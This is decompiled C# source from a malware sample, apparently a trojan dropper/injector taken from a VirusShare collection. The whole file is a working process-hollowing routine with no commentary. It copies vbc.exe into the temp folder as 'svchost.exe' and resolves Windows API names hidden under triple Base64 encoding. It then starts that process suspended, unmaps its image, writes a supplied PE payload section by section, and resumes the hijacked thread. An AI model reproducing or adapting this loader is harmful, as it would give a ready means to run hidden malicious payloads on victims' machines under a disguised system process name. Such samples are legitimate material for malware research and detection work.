// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Do, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EE565A8A-23A7-4686-8A31-21133B42B36B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Dropper.Win32.Injector.dihu-4bafcb0947a4bf1bc33e1247a84ba48c6f8a9b1b46bcea01030c4001a6b32c8e.exe

using \u0004;
using \u0006;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0006
{
  internal class \u0001
  {
    [DllImport("kernel32", EntryPoint = "LoadLibraryA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr \u0001([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

    [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr \u0001(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

    public static \u0001 \u0001<\u0001>([In] string obj0, [In] string obj1)
    {
      \u0001 forFunctionPointer;
      do
      {
        if (true)
        {
          IntPtr handle = \u0001.\u0001(ref obj0);
          IntPtr ptr;
          while (true)
          {
            ref string local = ref obj1;
            ptr = \u0001.\u0001(handle, ref local);
            if (false)
              handle = ptr;
            else
              break;
          }
          Type t = typeof (\u0001);
          forFunctionPointer = (\u0001) Marshal.GetDelegateForFunctionPointer(ptr, t);
        }
        do
          ;
        while (false);
      }
      while (false);
      return forFunctionPointer;
    }

    public static bool \u0001([In] byte[] obj0)
    {
      bool flag;
      try
      {
        string tempPath = Path.GetTempPath();
        try
        {
          string sourceFileName = Path.GetDirectoryName(Environment.SystemDirectory) + "\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe";
          string destFileName = tempPath + "xcoca.ine";
          if (true)
            File.Copy(sourceFileName, destFileName, true);
          \u0002.\u0001().FileSystem.RenameFile(tempPath + "xcoca.ine", "svchost.exe");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        IntPtr zero1 = IntPtr.Zero;
        IntPtr[] cxdbudyylwvovpikzgvv = new IntPtr[4];
        byte[] lzjgcropxjucjzhru = new byte[68];
        int int32_1 = BitConverter.ToInt32(obj0, 60);
        \u0001.\u0001 obj1 = \u0001.\u0001<\u0001.\u0001>(\u0001.\u0001("WVRKV2VXSnRWbk5OZWtrOQ=="), \u0001.\u0001("VVROS2JGbFlVbXhWU0VwMldUSldlbU13UlQwPQ=="));
        int int16 = (int) BitConverter.ToInt16(obj0, checked (int32_1 + 6));
        IntPtr tfwyksabfcequuentfki = new IntPtr(BitConverter.ToInt32(obj0, checked (int32_1 + 84)));
        \u0001.\u0007 obj2 = \u0001.\u0001<\u0001.\u0007>(\u0001.\u0001("WVRKV2VXSnRWbk5OZWtrOQ=="), \u0001.\u0001("VWpKV01GWkhhSGxhVjBaclVUSTVkV1JIVmpSa1FUMDk="));
        if (obj1((string) null, new StringBuilder(tempPath + "svchost.exe"), zero1, zero1, false, 4, zero1, (string) null, lzjgcropxjucjzhru, cxdbudyylwvovpikzgvv))
        {
          uint[] numArray1 = new uint[179];
          numArray1[0] = 65538U;
          \u0001.\u0005 obj3 = \u0001.\u0001<\u0001.\u0005>(\u0001.\u0001("WW01U2EySkhkejA9"), \u0001.\u0001("VjI1a1ZtSnRNV2hqUmxwd1dsaGtVRnBzVG14Wk0xSndZakkwUFE9PQ=="));
          if (obj2(cxdbudyylwvovpikzgvv[1], numArray1))
          {
            IntPtr quvwthwwjgvuhokxneb = new IntPtr(checked ((long) numArray1[41] + 8L));
            IntPtr zero2 = IntPtr.Zero;
            \u0001.\u0003 obj4 = \u0001.\u0001<\u0001.\u0003>(\u0001.\u0001("WVRKV2VXSnRWbk5OZWtrOQ=="), \u0001.\u0001("VlcxV2FGcEdRbmxpTWs1c1l6Tk9UbHBYTVhaamJtczk="));
            IntPtr vcakrvbhvwhuceaqeqbu = new IntPtr(4);
            IntPtr zero3 = IntPtr.Zero;
            if (obj4(cxdbudyylwvovpikzgvv[0], quvwthwwjgvuhokxneb, ref zero2, (int) vcakrvbhvwhuceaqeqbu, ref zero3) && obj3(cxdbudyylwvovpikzgvv[0], zero2) == 0U)
            {
              IntPtr num1 = new IntPtr(BitConverter.ToInt32(obj0, checked (int32_1 + 52)));
              \u0001.\u0004 obj5 = \u0001.\u0001<\u0001.\u0004>(\u0001.\u0001("WVRKV2VXSnRWbk5OZWtrOQ=="), \u0001.\u0001("Vm0xc2VXUklWbWhpUlVaellrYzVhbEpZWnowPQ=="));
              IntPtr num2 = new IntPtr(BitConverter.ToInt32(obj0, checked (int32_1 + 80)));
              IntPtr jowpxdjwqjuhogqrsxds = obj5(cxdbudyylwvovpikzgvv[0], num1, num2, 12288, 64);
              \u0001.\u0002 obj6 = \u0001.\u0001<\u0001.\u0002>(\u0001.\u0001("WVRKV2VXSnRWbk5OZWtrOQ=="), \u0001.\u0001("VmpOS2NHUkhWbEZqYlRscVdsaE9lbFJYVm5SaU0wbzE="));
              int int32_2 = jowpxdjwqjuhogqrsxds.ToInt32();
              int rrrrxosenyejfsnirrhy;
              int num3 = obj6(cxdbudyylwvovpikzgvv[0], jowpxdjwqjuhogqrsxds, obj0, checked ((uint) (int) tfwyksabfcequuentfki), rrrrxosenyejfsnirrhy) ? 1 : 0;
              int num4 = checked (int16 - 1);
              int num5;
              int num6;
              while (true)
              {
                num5 = num4;
                num6 = 0;
                if (num6 != 0)
                  num4 = num6;
                else
                  break;
              }
              int num7 = num5;
              int num8 = num6;
              while (num8 <= num7)
              {
                int[] dst = new int[10];
                Buffer.BlockCopy((Array) obj0, checked (int32_1 + 248 + num8 * 40), (Array) dst, 0, 40);
                byte[] numArray2 = new byte[checked (dst[4] - 1 + 1)];
                Buffer.BlockCopy((Array) obj0, dst[5], (Array) numArray2, 0, numArray2.Length);
                num2 = new IntPtr(checked (int32_2 + dst[3]));
                num1 = new IntPtr(numArray2.Length);
                int num9 = obj6(cxdbudyylwvovpikzgvv[0], num2, numArray2, checked ((uint) (int) num1), rrrrxosenyejfsnirrhy) ? 1 : 0;
                checked { ++num8; }
              }
              num2 = new IntPtr(checked ((long) numArray1[41] + 8L));
              num1 = new IntPtr(4);
              \u0001.\u0008 obj7 = \u0001.\u0001<\u0001.\u0008>(\u0001.\u0001("WVRKV2VXSnRWbk5OZWtrOQ=="), \u0001.\u0001("VlRKV01GWkhhSGxhVjBaclVUSTVkV1JIVmpSa1FUMDk="));
              int num10 = obj6(cxdbudyylwvovpikzgvv[0], num2, BitConverter.GetBytes(jowpxdjwqjuhogqrsxds.ToInt32()), checked ((uint) (int) num1), rrrrxosenyejfsnirrhy) ? 1 : 0;
              numArray1[44] = checked ((uint) (jowpxdjwqjuhogqrsxds.ToInt32() + BitConverter.ToInt32(obj0, int32_1 + 40)));
              int num11 = obj7(cxdbudyylwvovpikzgvv[1], numArray1) ? 1 : 0;
            }
          }
          int num = (int) \u0001.\u0001<\u0001.\u0006>(\u0001.\u0001("WVRKV2VXSnRWbk5OZWtrOQ=="), \u0001.\u0001("VlcxV2VtUlhNV3hXUjJoNVdsZEdhdz09"))(cxdbudyylwvovpikzgvv[1]);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
        goto label_18;
      }
      flag = true;
label_18:
      return flag;
    }

    public static string \u0001([In] string obj0) => Encoding.ASCII.GetString(Convert.FromBase64String(Encoding.ASCII.GetString(Convert.FromBase64String(Encoding.ASCII.GetString(Convert.FromBase64String(obj0))))));

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool \u0001(
      string nsaaayyxiwxutadgsaao,
      StringBuilder yaelgsyyuukztrqvair,
      IntPtr cewlzipzsvgyiztwik,
      IntPtr inwwxrwqidjqeuyxkood,
      [MarshalAs(UnmanagedType.Bool)] bool wfoojvvbbnglscgxq,
      int htielyvddfadkntgz,
      IntPtr kkrutwodeihptqjwli,
      string nxgstpofauhfcjreiroq,
      byte[] lzjgcropxjucjzhru,
      IntPtr[] cxdbudyylwvovpikzgvv);

    public delegate bool \u0002(
      IntPtr yuzwfogugkwixqnjobdk,
      IntPtr jowpxdjwqjuhogqrsxds,
      byte[] fpvxezkbcdrynrvrklx,
      uint tfwyksabfcequuentfki,
      int rrrrxosenyejfsnirrhy);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool \u0003(
      IntPtr wlgtqbdqgafiolwkzl,
      IntPtr quvwthwwjgvuhokxneb,
      ref IntPtr fguxwzpiepjihakurkpf,
      int vcakrvbhvwhuceaqeqbu,
      ref IntPtr nivhjtjskikpvjlxrvo);

    public delegate IntPtr \u0004(
      IntPtr rycgwwgxarrfkshx,
      IntPtr ngrjluldvckqlfxdksrq,
      IntPtr egwajgfjhhyytfppdpd,
      int etzcxkhoqqndxtcq,
      int zekzxizbzgnsrteh);

    public delegate uint \u0005(IntPtr refofbikvwbahkwuclj, IntPtr vdeuadljhcapdowk);

    public delegate uint \u0006(IntPtr ktiwqlouuqksitbffw);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool \u0007(IntPtr uqrghojzadnwzszlx, uint[] txepidslcgbqqzpghypo);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool \u0008(IntPtr kitzyvcnsktnehcwyq, uint[] hvcptjhuekktiephefbd);
  }
}
